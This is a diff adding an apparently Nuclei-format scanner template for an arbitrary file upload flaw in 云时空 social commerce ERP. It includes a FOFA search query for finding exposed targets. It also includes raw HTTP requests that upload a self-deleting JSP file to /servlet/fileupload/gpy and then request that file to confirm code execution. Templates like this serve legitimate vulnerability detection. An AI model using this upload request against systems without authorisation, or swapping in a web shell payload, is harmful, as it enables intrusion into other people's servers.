@@ -1,0 +1,51 @@
+id: cloudsk-gpy-fileupload
+info:
+  name: 云时空社会化商业 ERP - 任意文件上传
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/61b2bf45a165e027ea7014e0bd153f5bf1108b61/%E4%BA%91%E6%97%B6%E7%A9%BA/%E4%BA%91%E6%97%B6%E7%A9%BA%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9AERP%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
+  metadata:
+    verified: true
+    fofa-query: app="云时空社会化商业ERP系统"
+    hunter-query: demo
+  tags: cloudsk,fileupload
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y-%M-%D")}}'
+
+http:
+  - raw:
+      - |
+        POST /servlet/fileupload/gpy HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388
+        Content-Length: 220
+
+        --4eea98d02AEa93f60ea08dE3C18A1388
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        --4eea98d02AEa93f60ea08dE3C18A1388--
+
+      
+      - |+
+        GET /uploads/pics/{{date}}/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
